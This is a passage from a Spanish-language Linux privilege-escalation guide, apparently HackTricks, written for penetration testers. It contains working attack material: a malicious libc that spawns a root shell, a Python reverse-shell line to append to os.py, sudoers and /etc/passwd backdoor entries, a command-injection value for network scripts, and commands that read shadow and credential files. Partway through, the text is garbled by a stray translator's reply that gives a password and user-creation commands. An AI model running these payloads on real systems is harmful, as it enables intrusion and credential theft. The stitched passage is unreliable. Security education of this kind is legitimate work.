El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Normalmente, este archivo contiene la siguiente línea: `include /etc/ld.so.conf.d/*.conf`

Eso significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** las **librerías**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará librerías dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** sobre cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta referenciada dentro de un archivo de configuración en `/etc/ld.so.conf.d/*.conf` podría ser capaz de escalar privilegios.\
Consulta **cómo explotar esta mala configuración** en la siguiente página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/`, será utilizada por el programa en ese lugar tal como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
A continuación, crea una librería maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Las capacidades de Linux proporcionan un **subconjunto de los privilegios de root disponibles para un proceso**. Esto efectivamente divide los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede entonces ser otorgada de forma independiente a procesos. De este modo, el conjunto completo de privilegios se reduce, disminuyendo los riesgos de explotación.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de "execute"** implica que el usuario afectado puede "**cd**" dentro de la carpeta.\
El **"read"** bit implica que el usuario puede **listar** los **archivos**, y el **"write"** bit implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Listas de Control de Acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **sobrescribir los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control sobre el acceso a un archivo o directorio al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dar** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL oculto en drop-ins de sudoers

Una configuración errónea común es un archivo propiedad de root en `/etc/sudoers.d/` con modo `440` que aún otorga acceso de escritura a un usuario de bajos privilegios vía ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla sudo a pesar de los bits de modo restrictivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Esta es un high-impact ACL persistence/privesc path porque es fácil pasarlo por alto en revisiones solo con `ls -l`.

## Abrir shell sessions

En **versiones antiguas** puedes **hijack** alguna **shell session** de un usuario diferente (**root**).\
En **las versiones más recientes** solo podrás **connect** a screen sessions de **your own user**. Sin embargo, podrías encontrar **información interesante inside the session**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Conectarse a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Esto fue un problema con **versiones antiguas de tmux**. No pude realizar un hijack de una sesión de tmux (v2.1) creada por root como usuario no privilegiado.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** para un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc) entre septiembre de 2006 y el 13 de mayo de 2008 pueden verse afectadas por este bug.\
Este bug se produce al crear una nueva ssh key en esos OS, ya que **solo había 32,768 variaciones posibles**. Esto significa que todas las posibilidades se pueden calcular y **teniendo la ssh public key puedes buscar la private key correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor por defecto es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación por public key. El valor por defecto es `yes`.
- **PermitEmptyPasswords**: Cuando la autenticación por contraseña está permitida, especifica si el servidor permite iniciar sesión en cuentas con cadenas de contraseña vacías. El valor por defecto es `no`.

### Login control files

Estos archivos influyen en quién puede iniciar sesión y cómo:

- **`/etc/nologin`**: si está presente, bloquea los inicios de sesión no-root y muestra su mensaje.
- **`/etc/securetty`**: restringe desde dónde root puede iniciar sesión (allowlist de TTY).
- **`/etc/motd`**: banner post-login (puede leak detalles del entorno o de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión usando ssh, el valor por defecto es `no`. Valores posibles:

- `yes`: root puede iniciar sesión usando contraseña y private key
- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una private key
- `forced-commands-only`: Root puede iniciar sesión solo usando private key y si se especifican las opciones de comandos
- `no` : no

### AuthorizedKeysFile

Especifica archivos que contienen las public keys que se pueden usar para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio home. **Puedes indicar rutas absolutas** (comenzando en `/`) o **rutas relativas desde el home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **privada** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding te permite **usar tus SSH keys locales en lugar de dejar keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario salte a una máquina diferente, esa máquina podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** ssh-agent forwarding con la palabra clave `AllowAgentForwarding` (por defecto está permitido).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página ya que **puedes abusar de ello para escalar privilegios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfil

El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una nueva shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún profile script extraño, debes revisarlo en busca de **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del sistema operativo los archivos `/etc/passwd` y `/etc/shadow` pueden usar un nombre diferente o puede existir una copia de seguridad. Por lo tanto, se recomienda **localizarlos todos** y **comprobar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones se pueden encontrar **password hashes** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Escribible /etc/passwd

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Necesito el contenido de src/linux-hardening/privilege-escalation/README.md para poder traducirlo. Pégalo aquí y lo traduzco manteniendo la sintaxis markdown/HTML.

Mientras tanto, aquí tienes una contraseña generada y los comandos para crear el usuario hacker y asignarle esa contraseña:

Contraseña generada: G7r$k9vPq4!tZ2Lm

Comandos (ejecutar en la máquina destino):
sudo useradd -m -s /bin/bash hacker
echo 'hacker:G7r$k9vPq4!tZ2Lm' | sudo chpasswd
sudo passwd -e hacker  # opcional: forzar cambio de contraseña en el primer login

Cuando pegues el contenido del README.md lo traduzco al español siguiendo tus reglas.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ej.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para añadir un usuario ficticio sin contraseña.\ ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD ` /etc/passwd` está ubicado en `/etc/pwd.db` y `/etc/master.passwd`, además el `/etc/shadow` se renombra a `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que tomcat se inicie.

### Comprobar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos DB de Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Revisa el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para esto es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que es una aplicación de código abierto usada para recuperar muchas contraseñas almacenadas en un equipo local para Windows, Linux & Mac.

### Registros

Si puedes leer registros, podrías encontrar **información interesante/confidencial en ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos **mal** configurados (backdoored?) **registros de auditoría** pueden permitirte **registrar contraseñas** dentro de los registros de auditoría como se explica en este post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer logs el grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Archivos shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

También debes buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también revisar IPs y emails dentro de logs, o hashes mediante expresiones regulares.\
No voy a detallar aquí cómo hacer todo esto, pero si te interesa puedes comprobar las últimas comprobaciones que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Archivos escribibles

### Python library hijacking

Si sabes desde **dónde** se va a ejecutar un script de python y **puedes escribir** en esa carpeta, o puedes **modificar python libraries**, puedes modificar la OS library y añadirle un backdoor (si puedes escribir donde se va a ejecutar el script de python, copia y pega la librería os.py).

Para **backdoor** la librería simplemente añade al final de la librería os.py la siguiente línea (cambia IP y PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Una vulnerabilidad en `logrotate` permite a usuarios con **permisos de escritura** sobre un archivo de log o sus directorios padre potencialmente obtener privilegios escalados. Esto se debe a que `logrotate`, que suele ejecutarse como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante comprobar los permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores

Más información detallada sobre la vulnerabilidad puede encontrarse en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** así que siempre que descubras que puedes alterar logs, verifica quién gestiona esos logs y comprueba si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<whatever>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar/modificar** uno existente, entonces tu **sistema está pwned**.

Los network scripts, por ejemplo _ifcg-eth0_, se usan para conexiones de red. Se parecen exactamente a archivos .INI. Sin embargo, son ~sourced~ en Linux por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos network scripts no se maneja correctamente. Si tienes **espacios en blanco en el NAME, el sistema intenta ejecutar la parte que sigue al espacio en blanco**. Esto significa que **todo lo que vaya después del primer espacio en blanco se ejecuta como root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd, y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **clásico sistema de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart`, y a veces `reload` servicios. Estos pueden ejecutarse directamente o mediante enlaces simbólicos encontrados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un más reciente **sistema de gestión de servicios** introducido por Ubuntu, que usa archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit siguen utilizándose junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un moderno inicializador y gestor de servicios, ofreciendo características avanzadas como el inicio de daemons bajo demanda, la gestión de automontajes y las instantáneas del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones del administrador, simplificando el proceso de administración del sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comúnmente enganchan un syscall para exponer funcionalidad privilegiada del kernel a un manager en userspace. Una autenticación débil del manager (p. ej., checks de firma basados en FD-order o esquemas de contraseña pobres) puede permitir que una app local se haga pasar por el manager y escale a root en dispositivos ya rooteados. Más información y detalles de explotación aquí:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

El service discovery impulsado por regex en VMware Tools/Aria Operations puede extraer una ruta de binario de las líneas de comando de procesos y ejecutarlo con -v bajo un contexto privilegiado. Patrones permisivos (p. ej., usando \S) pueden coincidir con listeners preparados por un atacante en ubicaciones escribibles (p. ej., /tmp/httpd), llevando a ejecución como root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Mejor herramienta para buscar vectores de escalada de privilegios local en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
